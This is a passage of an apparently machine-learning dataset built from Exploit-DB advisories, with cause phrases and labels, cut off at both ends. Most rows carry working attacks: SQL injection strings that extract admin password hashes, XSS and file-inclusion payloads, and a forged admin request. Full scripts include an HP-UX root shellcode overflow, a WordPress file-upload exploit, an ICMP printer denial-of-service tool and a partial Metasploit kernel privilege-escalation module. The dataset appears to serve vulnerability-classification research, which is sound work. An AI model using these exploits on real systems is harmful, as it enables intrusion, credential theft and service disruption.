before using it in an SQL query,1
32187,Joomla! / Mambo Component com_utchat 0.2 - Multiple Remote File Inclusions source: https://www.securityfocus.com/bid/30571/info  The com_utchat component for Mambo and Joomla! is prone to multiple remote file-include vulnerabilities because it fails to sufficiently sanitize user-supplied data.  Exploiting these issues can allow an attacker to compromise the application and the underlying computer; other attacks are also possible.  These issues affect com_utchat 0.9.2; other versions may also be affected.   http://www.example.com/components/com_utchat/pfc/lib/pear/PHPUnit/GUI/Gtk.php?file=[Sh3LL] http://www.example.com/components/com_utchat/pfc/lib/pear/PHPUnit/GUI/SetupDecorator.php?aFile=[Sh3LL],fails to sufficiently sanitize user-supplied data,1
32272,Ovidentia 6.6.5 - 'index.php' Cross-Site Scripting source: https://www.securityfocus.com/bid/30735/info  Ovidentia is prone to a cross-site scripting vulnerability because it fails to sufficiently sanitize user-supplied input data.  An attacker may leverage this issue to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may help the attacker steal cookie-based authentication credentials and launch other attacks.  Ovidentia 6.6.5 is vulnerable; other versions may also be affected.  http://www.example.com/[path]/index.php?tg=search&pat=abcdefgh&idx=find&navpos=0&navitem=&field=<script>alert(333.45)</script>,fails to sufficiently sanitize user-supplied input data,1
38153,cPanel WebHost Manager (WHM) - '/webmail/x3/mail/clientconf.html?acct' Cross-Site Scripting source: https://www.securityfocus.com/bid/57060/info  cPanel and WHM are prone to multiple cross-site scripting vulnerabilities because it fails to properly sanitize user-supplied input.  An attacker may leverage these issues to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This can allow the attacker to steal cookie-based authentication credentials and to launch other attacks.  cPanel 11.34.0 and WHM 11.34.0 are vulnerable; other versions may also be affected.   http://www.example.com/webmail/x3/mail/clientconf.html?domain=&redirectdomain=&acct=%3Cscript%3Ealert%28%22XSS%20Vulnerability%22%29%3C/script%3E&archiving=0,fails to properly sanitize user-supplied input,1
27449,"phpWebSite 0.8.2/0.8.3 - 'article.php?sid' SQL Injection source: https://www.securityfocus.com/bid/17150/info   phpWebSite is prone to multiple SQL-injection vulnerabilities. These issues are due to a failure in the application to properly sanitize user-supplied input before using it in SQL queries.    A successful exploit could allow an attacker to compromise the application, access or modify data, or exploit vulnerabilities in the underlying database implementation.   Versions 0.83 and prior are vulnerable.  http://www.example.com/article.php?sid=[sql]",a failure in the application to properly sanitize user-supplied input before using it in SQL queries,1
32015,"PHP-Nuke 4ndvddb 0.91 Module - 'id' SQL Injection source: https://www.securityfocus.com/bid/30120/info  The '4ndvddb' module for PHP-Nuke is prone to an SQL-injection vulnerability because it fails to sufficiently sanitize user-supplied data before using it in an SQL query.  Exploiting this issue could allow an attacker to compromise the application, access or modify data, or exploit latent vulnerabilities in the underlying database.  This issue affects 4ndvddb 0.91; other versions may also be affected.  http://www.example.com/modules.php?name=4ndvddb&rop=show_dvd&id=1%2F%2A%2A%2Funion%2F%2A%2A%2Fselect%2F%2A%2A%2F0%2C0,aid,pwd,3,4,5,6,7,8,9,10%2F%2A%2A%2Ffrom%2F%2A%2A%2Fnuke_authors%2F%2A%2A%2Fwhere%2F%2A%2A%2Fradminsuper%3D1%2F%2A",fails to sufficiently sanitize user-supplied data before using it in an SQL query,1
34013,"McAfee Email Gateway 6.7.1 - 'systemWebAdminConfig.do' Remote Security Bypass source: https://www.securityfocus.com/bid/40255/info  McAfee Email Gateway is prone to a security-bypass vulnerability because the web-based interface fails to properly perform user-profile checks.  Attackers can exploit this issue to bypass certain security restrictions to edit property and configuration settings.  McAfee Email Gateway 6.7.1 is vulnerable; other versions may also be affected.  POST /admin/systemWebAdminConfig.do?method=save&pageId=13&isMenuToggled=1 HTTP/1.1 Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, application/vnd.ms-excel, application/vnd.ms-powerpoint, application/msword, application/xaml+xml, application/vnd.ms-xpsdocument, application/x-ms-xbap, application/x-ms-application, */* Referer: https://www.example.com:XXXXX/admin/systemWebAdminConfig.do?method=init&isMenuTog gled=1&pageId=13 Accept-Language: es Content-Type: application/x-www-form-urlencoded UA-CPU: x86 Accept-Encoding: gzip, deflate User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648; InfoPath.1; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729) Host: www.example.com:XXXXX Connection: Keep-Alive Cache-Control: no-cache Cookie:CTRGT=[YOUR COOKIE HERE]; CTSecureToken=[YOUR COOKIE HERE]; tabbedMenuSelected=13; itemToHighlight=https%3A//www.example.com%3AXXXXX/admin/systemWebAdminConfig.do %3Fmethod%3Dinit%26isMenuToggled%3D1%26pageId%3D13; menusToExpand=ConfigurationMenu%2CCertificateManagementMenu%2CWebAdminConfiguration Menu%2C; JSESSIONID=[YOUR COOKIE HERE] Content-Length: 2650 pageId=13&vipId=0&vipBased=0&rows%5B0%5D.attr_name=gui_log_level&rows%5B0%5D.attr_ty pe=12&rows%5B0%5D.attr_validate=30060003%3A1%2C30060004%3A4%2C30060005%3A5%2C 30060006%3A6&rows%5B0%5D.attr_validate_str=30060003%3A1%2C30060004%3A4%2C300600 05%3A5%2C30060006%3A6&rows%5B0%5D.attr_depends=&rows%5B0%5D.is_mult_val=0&rows %5B0%5D.lang_tag_id_dv=2000003.displayValue&rows%5B0%5D.is_ascii_only=0&rows%5B0%5 D.proc_id=90&rows%5B0%5D.attr_value_clone=4&rows%5B0%5D.attr_value=4&rows%5B1%5D.a ttr_name=gui_timeout&rows%5B1%5D.attr_type=2&rows%5B1%5D.attr_validate=%5B1- 30%5D&rows%5B1%5D.attr_validate_str=%5B1- 30%5D&rows%5B1%5D.attr_depends=&rows%5B1%5D.is_mult_val=0&rows%5B1%5D.lang_tag_i d_dv=2001014.displayValue&rows%5B1%5D.is_ascii_only=0&rows%5B1%5D.proc_id=90&rows%5 B1%5D.attr_value_clone=30&rows%5B1%5D.attr_value=30&rows%5B2%5D.attr_name=auto_refres h&rows%5B2%5D.attr_type=2&rows%5B2%5D.attr_validate=%5B1- 30%5D&rows%5B2%5D.attr_validate_str=%5B1- 30%5D&rows%5B2%5D.attr_depends=&rows%5B2%5D.is_mult_val=0&rows%5B2%5D.lang_tag_i d_dv=2001017.displayValue&rows%5B2%5D.is_ascii_only=0&rows%5B2%5D.proc_id=90&rows%5 B2%5D.attr_value_clone=10&rows%5B2%5D.attr_value=10&rows%5B3%5D.attr_name=enable_logi n_disclaimer_text&rows%5B3%5D.attr_type=5&rows%5B3%5D.attr_validate=&rows%5B3%5D.attr _validate_str=&rows%5B3%5D.attr_depends=&rows%5B3%5D.is_mult_val=0&rows%5B3%5D.lang _tag_id_dv=2001044.displayValue&rows%5B3%5D.is_ascii_only=0&rows%5B3%5D.proc_id=90&r ows%5B3%5D.attr_value_clone=true&rows%5B3%5D.attr_value=true&rows%5B4%5D.attr_name=l ogin_disclaimer_text&rows%5B4%5D.attr_type=19&rows%5B4%5D.attr_validate=&rows%5B4%5D .attr_validate_str=&rows%5B4%5D.attr_depends=enable_login_disclaimer_text&rows%5B4%5D.is_ mult_val=0&rows%5B4%5D.lang_tag_id_dv=2001045.displayValue&rows%5B4%5D.is_ascii_only= 0&rows%5B4%5D.proc_id=90&rows%5B4%5D.attr_value_clone=**************************** ***************************%0D%0A%22NEW DISCLAIMER.%22%0D%0A*******************************************************&ro ws%5B4%5D.attr_value=*******************************************************%0D%0 A%22NEW DISCLAIMER.%22%0D%0A*******************************************************&su bmitValue=Submit",the web-based interface fails to properly perform user-profile checks,1
32082,"Def_Blog 1.0.3 - 'comaddok.php?article' SQL Injection source: https://www.securityfocus.com/bid/30289/info  Def_Blog is prone to multiple SQL-injection vulnerabilities because it fails to sufficiently sanitize user-supplied data before using it in an SQL query.  Exploiting these issues could allow an attacker to compromise the application, access or modify data, or exploit latent vulnerabilities in the underlying database.  Def_Blog 1.0.3 is vulnerable; other versions may also be affected.   http://www.example.com/[def_blog_path]/comaddok.php?article=-1+union+select+1,concat(pseudo,0x3a3a,mdp)+from+def_user--",fails to sufficiently sanitize user-supplied data before using it in an SQL query,1
27642,AR-Blog 5.2 - 'print.php' Cross-Site Scripting source: https://www.securityfocus.com/bid/17522/info  The ar-blog application is prone to a cross-site scripting vulnerability because it fails to properly sanitize user-supplied input.   An attacker may leverage this issue to have arbitrary script code executed in the browser of an unsuspecting user in the context of the affected site. This may help the attacker steal cookie-based authentication credentials and launch other attacks.  Version 5.2 is vulnerable; other versions may also be affected.  http://www.example.com/print.php?id=<script>alert(1)</script>,fails to properly sanitize user-supplied input,1
35407,phpWebSite 1.7.1 - 'local' Cross-Site Scripting source: https://www.securityfocus.com/bid/46673/info  phpWebSite is prone to a cross-site scripting vulnerability because it fails to properly sanitize user-supplied input.  An attacker may leverage this issue to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This can allow the attacker to steal cookie-based authentication credentials and launch other attacks.  phpWebSite 1.7.1 is vulnerable; other versions may also be affected.   http://www.example.com/phpwebsite_1_7_1/javascript/editors/fckeditor/editor/custom.php?local=%3Cscript%3Ealert(0)%3C%2fscript%3E http://www.example.com/phpwebsite_1_7_1/javascript/editors/fckeditor/editor/custom.php?local=%3Cscript%3Ealert(0)%3C%2fscript%3E,fails to properly sanitize user-supplied input,1
19535,"HP-UX 10.20 newgrp - Local Privilege Escalation #source: https://www.securityfocus.com/bid/683/info # #Due to insufficient bounds checking on user supplied arguments, it is possible to overflow an internal buffer and execute arbitrary code as root.   #!/usr/bin/perl  use FileHandle;  sub h2cs { local($stuff)=@_; local($rv); while($stuff !~ /^$/) { $bob=$stuff; $bob =~ s/^(..).*$/$1/; $stuff =~ s/^..//; $rv.=chr(oct(""0x${bob}"")); } return $rv; }  open(PIPE,""uname -r|""); chop($rev=<PIPE>); close(PIPE); $rev =~ s/^.*\.(.*)\..*$/$1/;  if ($rev eq ""10"") { $offset=2074; $prealign=""""; $postalign=""P""; $pcoq=h2cs(""7b03A00C""); } else { $offset=2074; $prealign=""""; $postalign=""P""; $pcoq=h2cs(""7b03300C""); }  $nop=h2cs(""08210280""); $code=""""; # Oddly enough, real uid already == 0 # Could probably make a + + link bug out of this, too.. #$code.=h2cs(""34160506""); # LDI 643,r22 #$code.=h2cs(""96d60534""); # SUBI 666,r22,r22 #$code.=h2cs(""20200801""); # LDIL L%0xc0000004,r1 #$code.=h2cs(""e420e008""); # BLE 4(sr7,r1) #$code.=h2cs(""0b5a029a""); # XOR arg0,arg0,arg0 $code.=h2cs(""e83f1ffd""); # BL .+8,r1 $code.=h2cs(""08210280""); # NOP $code.=h2cs(""34020102""); # LDI 129,rp $code.=h2cs(""08410402""); # SUB r1,rp,rp $code.=h2cs(""60400162""); # STB r0,177(rp) $code.=h2cs(""b45a0154""); # ADDI 170,rp,arg0 $code.=h2cs(""0b390299""); # XOR arg0,arg0,arg0 $code.=h2cs(""0b180298""); # XOR arg0,arg0,arg0 $code.=h2cs(""341604be""); # LDI 607,r22 $code.=h2cs(""20200801""); # LDIL L%0xc0000004,r1 $code.=h2cs(""e420e008""); # BLE 4(sr7,r1) $code.=h2cs(""96d60534""); # SUB 666,r22,r22 $code.=h2cs(""deadcafe""); # Illegal instruction -- dump core if exec fails $data=""/bin/sh.""; # Data stuff  $codedata=$code.$data; $num=int(($offset-length($code)-length($data)-4)/4); $pre=""$nop""x$num; $of=$prealign; $of.=$pre.$code.$data.$postalign.$pcoq; exec(""/bin/newgrp"",""$of"");",insufficient bounds checking on user supplied arguments,1
30830,Ossigeno CMS 2.2_pre1 - '/upload/xax/ossigeno/admin/uninstall_module.php?level' Remote File Inclusion source: https://www.securityfocus.com/bid/26654/info      Ossigeno CMS is prone to multiple remote file-include vulnerabilities because it fails to sufficiently sanitize user-supplied data.      Exploiting these issues may allow an attacker to compromise the application and the underlying system; other attacks are also possible.      These issues affect Ossigeno CMS 2.2_pre1; other versions may also be vulnerable.   http://www.example.com/upload/xax/ossigeno/admin/uninstall_module.php?level=http://www.example2.com,fails to sufficiently sanitize user-supplied data,1
25368,"PostNuke Phoenix 0.760 RC3 - 'SID' SQL Injection source: https://www.securityfocus.com/bid/13077/info  A remote SQL Injection vulnerability affects PostNuke Phoenix. This issue is due to a failure of the application to properly sanitize user-supplied input prior to including it in SQL queries.  An attacker may exploit this issue to manipulate SQL queries to the underlying database. This may facilitate theft sensitive information, potentially including authentication credentials, and data corruption.  http://localhost/modules.php?op=modload&name=News&file=article&sid='SQL_INJECTION&POSTNUKESID=355776cfb622466924a7096d4471a480",a failure of the application to properly sanitize user-supplied input prior to including it in SQL queries,1
6867,"WordPress Plugin E-Commerce 3.4 - Arbitrary File Upload #!/usr/bin/perl  use warnings; use strict; use LWP::UserAgent; use HTTP::Request::Common;  my $fname = rand(99999) . "".php""; # no int()  print <<INTRO; # messy print i know.. - Wordpress Plugin e-Commerce <= 3.4 Arbitrary File Upload -             Discovered && Coded by: t0pP8uZz             Discovered on: 20 October 2008      Theres no current vulnerabilitys for this plugin, but the   vulnerability explained here no longer exists in the later   versions of the plugin, due to a code rewrite.      In testing this vulnerability, i wrote a scraping content   program, and found ALOT of vulnerable sites.      This exploit will upload a selected file to the...   ... /wp-content/plugins/wp-shopping-cart/ directory.      If the directory is not writable (rare cases) you can   mod this exploit and use the insecure GET variable   ""imagedir"" to directory traversal.. so you can upload   in diffrent directorys.      Contact: irc.rizon.net #sectalk      Dork: inurl:""/wp-content/plugins/wp-shopping-cart/""  INTRO  print ""\nEnter URL(ie: http://site.com/mambo): "";     chomp(my $url=<STDIN>);      print ""\nEnter File Path(path to local file to upload): "";     chomp(my $file=<STDIN>);      my $ua = LWP::UserAgent->new; my $re = $ua->request(POST $url . '/wp-content/plugins/wp-shopping-cart/image_processing.php',                       Content_Type => 'form-data',                       Content      => [ Submit => ""Add"", image => [ $file, $fname, Content_Type => 'plain/text' ], ] );  die ""Exploit Failed: HTTP POST Failed!"" unless $re->is_success;  if($re->content =~ /Fatal error/i) {      print ""Complete! To see if exploit was successfull visit the following URL for your uploaded file.\n"";     print ""Uploaded File: "" . $url . ""/wp-content/plugins/wp-shopping-cart/"" . $fname . ""\n""; } else {     print ""Exploit Failed! Target host not vulnerable!\n""; } exit;  # milw0rm.com [2008-10-29]",a code rewrite.,0
24725,"Trend Micro ScanMail for Domino 2.51/2.6 - Remote File Disclosure source: https://www.securityfocus.com/bid/11612/info  ScanMail for Domino is reported prone to a vulnerability that may allow sensitive configuration files to be disclosed to remote attackers.  A successful attack may allow an attacker to disclose sensitive information and allow the attacker to disable antivirus protection on a gateway allowing potentially malicious email messages to reach internal users. It is conjectured that as malicious emails are delivered to client mail applications that are seemingly protected by the gateway application, a user may be inclined to open the message due to a false sense of security. This issue may result in a malicious code infection.  All versions of ScanMail for Domino are considered to be vulnerable at the moment.  # Written by DokFLeed <dokfleed at dokfleed.net> # Looking for smency.nsf Trend/Lotus # if(description) { script_version (""$Revision: 1.3 $""); script_id(14312); script_name(english:""ScanMail file check"");  desc[""english""] =  ""This script attempts to read sensitive files used by Trend ScanMail, an anti-virus protection program for Domino (formerly Lotus Notes). An attacker, exploiting this flaw, may gain access to confidential data or disable the anti-virus protection.  Risk : Medium"";  script_description(english:desc[""english""]); script_summary(english:""Checks for the presence ScanMail files"");  script_category(ACT_GATHER_INFO);  script_family(english:""CGI abuses"");  script_copyright(english:""This script is Copyright (C) 2004 by DokFLeed"");  script_dependencie(""find_service.nes"", ""http_version.nasl""); script_require_ports(""Services/www"", 80); exit(0);  }  # Start of Code  include(""http_func.inc""); include(""http_keepalive.inc"");  port = get_http_port(default:80);  if (!get_port_state(port)) exit(0);  if (http_is_dead(port:port)) exit(0);  files = make_array(""/smency.nsf"" , ""Encyclopedia"", ""/smconf.nsf"" , ""Configuration"", ""/smhelp.nsf"" , ""Help"", ""/smftypes.nsf"" , ""File Types"", ""/smmsg.nsf"" , ""Messages"", ""/smquar.nsf"" , ""Quarantine"", ""/smtime.nsf"" , ""Scheduler"", ""/smsmvlog.nsf"" , ""Log"", ""/smadmr5.nsf"" , ""Admin Add-in""); report = """"; foreach path (keys(files)) { req = http_get(item:path, port:port); r = http_keepalive_send_recv(port:port, data:req);  if (r == NULL) exit(0);  if (""Trend ScanMail"" >< r) { if (!report) { report = ""Sensitive files used by Trend ScanMail, an anti-virus protection program for Domino (formerly Lotus Notes), are readable via the web. These files might expose confidential data or allow an attacker to disable the anti-virus protection.  Solution: Password protect access to these files.  The following files were found: ""; } report += string(""\n "", path, "" - "", files[path]); } } if (report) security_warning(port:port, data:report);",a false sense of security,0
31451,W-Agora 4.0 - 'create_user.php?bn_dir_default' Remote File Inclusion source: https://www.securityfocus.com/bid/28366/info    w-Agora is prone to multiple remote file-include vulnerabilities because it fails to sufficiently sanitize user-supplied data.    Exploiting these issues may allow an attacker to compromise the application and the underlying system; other attacks are also possible.    w-Agora 4.0 is vulnerable; other versions may also be affected.  http://www.example.com/w-agora_path/create_user.php?bn_dir_default=ZoRLu.txt?,fails to sufficiently sanitize user-supplied data,1
24839,"Ricoh Aficio 450/455 PCL Printer - Remote ICMP Denial of Service // source: https://www.securityfocus.com/bid/11932/info  It is reported that Ricoh 450/455 printers are susceptible to a remote denial of service vulnerability. This issue is due to a failure of the device to properly handle exceptional ICMP packets.  Remote attackers may exploit this vulnerability to restart affected devices. Repeated packets may be utilized to sustain the condition, causing the device to repeatedly restart. Source addresses of the malicious ICMP packets may also be spoofed, reducing the likelihood of locating, or blocking access to the attacker.  Due to code reuse among devices, it is likely that other printers are also affected.  /*  * RICOH Aficio 450/455 PCL 5e Printer ICMP DOS vulnerability Exploit.  * DATE: 12.15.2004  * Vuln Advisory : Hongzhen Zhou<felix__zhou _at_ hotmail _dot_ com>  * Exploit Writer : x90c(Kyong Joo)@www.chollian.net/~jyj9782  *  * Testing -----------------------------------------------  * root@testbed:~/raw# gcc -o rpcl_icmpdos rpcl_icmpdos.c  * root@testbed:~/raw# ./rpcl_icmpdos  * Usage: ./rpcl_icmpdos <victim>  * root@testbed:~/raw# ./rpcl_icmpdos 192.168.2.4  * exploit sent ok() = ..x-_-x..  * root@testbed:~/raw#  *  */  #include<sys/types.h> #include<sys/socket.h> #include<netinet/in.h> #include<arpa/inet.h> #include<linux/ip.h> #include<linux/icmp.h>  unsigned short cksum(unsigned short *buf, int len);  struct icmp_packet{         struct icmphdr icmp;         struct iphdr inip;         unsigned char bigger[90];               // STEP1: Bigger Data(ICMP Header(8)+ inip(20) + 90(bigger data)) } packet;   /* ########################  * #     Entry Point      #  * ######################## */  int main(int argc, char *argv[]){ struct sockaddr_in ca; int sockfd, ret;  if(argc<2){         printf(""Usage: %s <victim>\n"", argv[0]);         exit(-1); }  sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);  memset(&packet, 0, sizeof(packet));  packet.icmp.type = 3;                           // STEP2: Destination Unreachable. packet.icmp.code = 1; packet.icmp.un.echo.id = getpid(); packet.icmp.un.echo.sequence = 0;  packet.inip.ihl = 5; packet.inip.version = 4; packet.inip.tot_len = htons(20); packet.inip.id = htons(9090); packet.inip.ttl = 90; packet.inip.protocol = IPPROTO_TCP;             // STEP3: IPPROTO_UDP also useable. packet.inip.saddr = inet_addr(""127.0.0.1""); packet.inip.daddr = inet_addr(""127.0.0.1""); packet.inip.check = (unsigned short) cksum((unsigned short *)&packet.inip, 20);  packet.icmp.checksum = cksum((void *)&packet, sizeof(packet));  memset(&ca, 0, sizeof(ca)); ca.sin_family = AF_INET; ca.sin_addr.s_addr = inet_addr(argv[1]);   if((sendto(sockfd, &packet, sizeof(packet), 0, (struct sockaddr *)&ca, sizeof(ca))) == sizeof(packet))         printf(""exploit sent ok() = ..x-_-x..\n""); else         printf(""exploit sent failed() = ..o^O^o..\n"");   close(sockfd);  }   /* ########################  * #  Internet Checksum   #  * ######################## */  unsigned short cksum(unsigned short *buf, int len){ register unsigned long sum;  for(sum = 0; len > 0; len--) sum += *buf++; sum = (sum >> 16) + (sum & 0xffff); sum += (sum >> 16); return ~sum; }",a failure of the device to properly handle exceptional ICMP packets,1
33888,ProArcadeScript - 'search.php' Cross-Site Scripting source: https://www.securityfocus.com/bid/39749/info  ProArcadeScript is prone to a cross-site scripting vulnerability because it fails to properly sanitize user-supplied input.  An attacker may leverage this issue to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may let the attacker steal cookie-based authentication credentials and launch other attacks.   http://www.example.com/search.php?searchstr= [XSS],fails to properly sanitize user-supplied input,1
37415,"Webify (Multiple Products) - Multiple HTML Injection / Local File Inclusions source: https://www.securityfocus.com/bid/54045/info  Multiple Webify products are prone to multiple HTML-injection and local file-include vulnerabilities because they fail to properly sanitize user-supplied input.  Exploiting these issues could allow an attacker to execute arbitrary HTML and script code in the context of the affected browser, steal cookie-based authentication credentials, and execute arbitrary local scripts in the context of the web server process. Other attacks are also possible.  The following Webify products are vulnerable:  Webify eDownloads Cart Webify eDownloads Webify Project Manager Webify Blog   Local file include:  http://www.example.com/index.php?page=[LOCAL FILE INCLUDE]  http://www.example.com/admin/index.php?page=[LOCAL FILE INCLUDE]  HTML injection:  http://www.example.com/admin/index.php?page=query [Persistent Script Code Inject via Query Value]  http://www.example.com/admin/index.php?page=addobjects [Persistent Script Code Inject via addObject name Value]  http://www.example.com/admin/index.php?page=formdesigner [Persistent Script Code Inject via former label Value]  http://www.example.com/admin/index.php?page=comments [Persistent Script Code Inject via Comment text & name Value]  http://www.example.com/admin/index.php?page=submissions [Persistent Script Code Inject via submission name Value]",fail to properly sanitize user-supplied input,1
34322,PHPWCMS 1.4.5 - 'PHPwcms.php' Cross-Site Scripting source: https://www.securityfocus.com/bid/41720/info  phpwcms is prone to a cross-site scripting vulnerability because it fails to properly sanitize user-supplied input.  An attacker may leverage this issue to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may let the attacker steal cookie-based authentication credentials and launch other attacks.  phpwcms 1.4.5 is vulnerable; other versions may also be affected.   http:/www.example.com/phpwcms.php?do=modules&module=calendar&calendardate=8-2010%22+onmouseover=alert%2834%29+style=position:absolute;width:100%;height:100%;left:0;top:0;+%22,fails to properly sanitize user-supplied input,1
42368,"Razer Synapse 2.20.15.1104 - rzpnk.sys ZwOpenProcess (Metasploit) ## # This module requires Metasploit: https://metasploit.com/download # Current source: https://github.com/rapid7/metasploit-framework ##  require 'msf/core/exploit/local/windows_kernel' require 'rex' require 'metasm'  class MetasploitModule < Msf::Exploit::Remote   Rank = NormalRanking    include Msf::Exploit::Local::WindowsKernel   include Msf::Post::Windows::Priv    # the max size our hook can be, used before it's generated for the allocation   HOOK_STUB_MAX_LENGTH = 256    def initialize(info = {})     super(update_info(info,       'Name'           => 'Razer Synapse rzpnk.sys ZwOpenProcess',       'Description'    => %q{         A vulnerability exists in the latest version of Razer Synapse         (v2.20.15.1104 as of the day of disclosure) which can be leveraged         locally by a malicious application to elevate its privileges to those of         NT_AUTHORITY\SYSTEM. The vulnerability lies in a specific IOCTL handler         in the rzpnk.sys driver that passes a PID specified by the user to         ZwOpenProcess. This can be issued by an application to open a handle to         an arbitrary process with the necessary privileges to allocate, read and         write memory in the specified process.          This exploit leverages this vulnerability to open a handle to the         winlogon process (which runs as NT_AUTHORITY\SYSTEM) and infect it by         installing a hook to execute attacker controlled shellcode. This hook is         then triggered on demand by calling user32!LockWorkStation(), resulting         in the attacker's payload being executed with the privileges of the         infected winlogon process. In order for the issued IOCTL to work, the         RazerIngameEngine.exe process must not be running. This exploit will         check if it is, and attempt to kill it as necessary.          The vulnerable software can be found here:         https://www.razerzone.com/synapse/. No Razer hardware needs to be         connected in order to leverage this vulnerability.          This exploit is not opsec-safe due to the user being logged out as part         of the exploitation process.       },       'Author'         => 'Spencer McIntyre',       'License'        => MSF_LICENSE,       'References'     => [         ['CVE', '2017-9769'],         ['URL', 'https://warroom.securestate.com/cve-2017-9769/']       ],       'Platform'       => 'win',       'Targets'        =>         [           # Tested on (64 bits):           # * Windows 7 SP1           # * Windows 10.0.10586           [ 'Windows x64', { 'Arch' => ARCH_X64 } ]         ],       'DefaultOptions' =>         {           'EXITFUNC'   => 'thread',           'WfsDelay'   => 20         },       'DefaultTarget'  => 0,       'Privileged'     => true,       'DisclosureDate' => 'Mar 22 2017'))   end    def check     # Validate that the driver has been loaded and that     # the version is the same as the one expected     client.sys.config.getdrivers.each do |d|       if d[:basename].downcase == 'rzpnk.sys'         expected_checksum = 'b4598c05d5440250633e25933fff42b0'         target_checksum = client.fs.file.md5(d[:filename])          if expected_checksum == Rex::Text.to_hex(target_checksum, '')           return Exploit::CheckCode::Appears         else           return Exploit::CheckCode::Detected         end       end     end      Exploit::CheckCode::Safe   end    def exploit     if is_system?       fail_with(Failure::None, 'Session is already elevated')     end      if check == Exploit::CheckCode::Safe       fail_with(Failure::NotVulnerable, 'Exploit not available on this system.')     end      if session.platform != 'windows'       fail_with(Failure::NoTarget, 'This exploit requires a native Windows meterpreter session')     elsif session.arch != ARCH_X64       fail_with(Failure::NoTarget, 'This exploit only supports x64 Windows targets')     end      pid = session.sys.process['RazerIngameEngine.exe']     if pid       # if this process is running, the IOCTL won't work but the process runs       # with user privileges so we can kill it       print_status(""Found RazerIngameEngine.exe pid: #{pid}, killing it..."")       session.sys.process.kill(pid)     end      pid = session.sys.process['winlogon.exe']     print_status(""Found winlogon pid: #{pid}"")      handle = get_handle(pid)     fail_with(Failure::NotVulnerable, 'Failed to open the process handle') if handle.nil?     vprint_status('Successfully opened a handle to the winlogon process')      winlogon = session.sys.process.new(pid, handle)     allocation_size = payload.encoded.length + HOOK_STUB_MAX_LENGTH     shellcode_address = winlogon.memory.allocate(allocation_size)     winlogon.memory.protect(shellcode_address)     print_good(""Allocated #{allocation_size} bytes in winlogon at 0x#{shellcode_address.to_s(16)}"")     winlogon.memory.write(shellcode_address, payload.encoded)     hook_stub_address = shellcode_address + payload.encoded.length      result = session.railgun.kernel32.LoadLibraryA('user32')     fail_with(Failure::Unknown, 'Failed to get a handle to user32.dll') if result['return'] == 0     user32_handle = result['return']      # resolve and backup the functions that we'll install trampolines in     user32_trampolines = {}  # address => original chunk     user32_functions = ['LockWindowStation']     user32_functions.each do |function|       address = get_address(user32_handle, function)       winlogon.memory.protect(address)       user32_trampolines[function] = {         address:  address,         original: winlogon.memory.read(address, 24)       }     end      # generate and install the hook asm     hook_stub = get_hook(shellcode_address, user32_trampolines)     fail_with(Failure::Unknown, 'Failed to generate the hook stub') if hook_stub.nil?     # if this happens, there was a programming error     fail_with(Failure::Unknown, 'The hook stub is too large, please update HOOK_STUB_MAX_LENGTH') if hook_stub.length > HOOK_STUB_MAX_LENGTH      winlogon.memory.write(hook_stub_address, hook_stub)     vprint_status(""Wrote the #{hook_stub.length} byte hook stub in winlogon at 0x#{hook_stub_address.to_s(16)}"")      # install the asm trampolines to jump to the hook     user32_trampolines.each do |function, trampoline_info|       address = trampoline_info[:address]       trampoline = Metasm::Shellcode.assemble(Metasm::X86_64.new, %{         mov  rax, 0x#{address.to_s(16)}         push rax         mov  rax, 0x#{hook_stub_address.to_s(16)}         jmp  rax       }).encode_string       winlogon.memory.write(address, trampoline)       vprint_status(""Installed user32!#{function} trampoline at 0x#{address.to_s(16)}"")     end      session.railgun.user32.LockWorkStation()     session.railgun.kernel32.CloseHandle(handle)   end    def get_address(dll_handle, function_name)     result = session.railgun.kernel32.GetProcAddress(dll_handle, function_name)     fail_with(Failure::Unknown, 'Failed to get function address') if result['return'] == 0     result['return']   end    # this is where the actual vulnerability is leveraged   def get_handle(pid)     handle = open_device(""\\\\.\\47CD78C9-64C3-47C2-B80F-677B887CF095"", 'FILE_SHARE_WRITE|FILE_SHARE_READ', 0, 'OPEN_EXISTING')     return nil unless handle     vprint_status('Successfully opened a handle to the driver')      buffer = [pid, 0].pack(target.arch.first == ARCH_X64 ? 'QQ' : 'LL')      session.railgun.add_function('ntdll', 'NtDeviceIoControlFile', 'DWORD',[       ['DWORD',  'FileHandle',         'in' ],       ['DWORD',  'Event',              'in' ],       ['LPVOID', 'ApcRoutine',         'in' ],       ['LPVOID', 'ApcContext',         'in' ],       ['PDWORD', 'IoStatusBlock',      'out'],       ['DWORD',  'IoControlCode',      'in' ],       ['PBLOB',  'InputBuffer',        'in' ],       ['DWORD',  'InputBufferLength',  'in' ],       ['PBLOB',  'OutputBuffer',       'out'],       ['DWORD',  'OutputBufferLength', 'in' ],     ])     result = session.railgun.ntdll.NtDeviceIoControlFile(handle, nil, nil, nil, 4, 0x22a050, buffer, buffer.length, buffer.length, buffer.length)     return nil if result['return'] != 0     session.railgun.kernel32.CloseHandle(handle)      result['OutputBuffer'].unpack(target.arch.first == ARCH_X64 ? 'QQ' : 'LL')[1]   end    def get_hook(shellcode_address, restore)     dll_handle = session.railgun.kernel32.GetModuleHandleA('kernel32')['return']     return nil if dll_handle == 0     create_thread_address = get_address(dll_handle, 'CreateThread')      stub = %{       call main       ; restore the functions where the trampolines were installed       push rbx     }      restore.each do |function, trampoline_info|       original = trampoline_info[:original].unpack('Q*')       stub << ""mov  rax, 0x#{trampoline_info[:address].to_s(16)}""       original.each do |chunk|         stub << %{           mov  rbx, 0x#{chunk.to_s(16)}           mov  qword ptr ds:[rax], rbx           add  rax, 8         }       end     end      stub << %{       pop  rbx       ret        main:       ; backup registers we're going to mangle       push r9       push r8       push rdx       push rcx        ; setup the arguments for the call to CreateThread       xor  rax, rax       push rax                                      ; lpThreadId       push rax                                      ; dwCreationFlags       xor  r9, r9                                   ; lpParameter       mov  r8, 0x#{shellcode_address.to_s(16)}      ; lpStartAddress       xor  rdx, rdx                                 ; dwStackSize       xor  rcx, rcx                                 ; lpThreadAttributes       mov  rax, 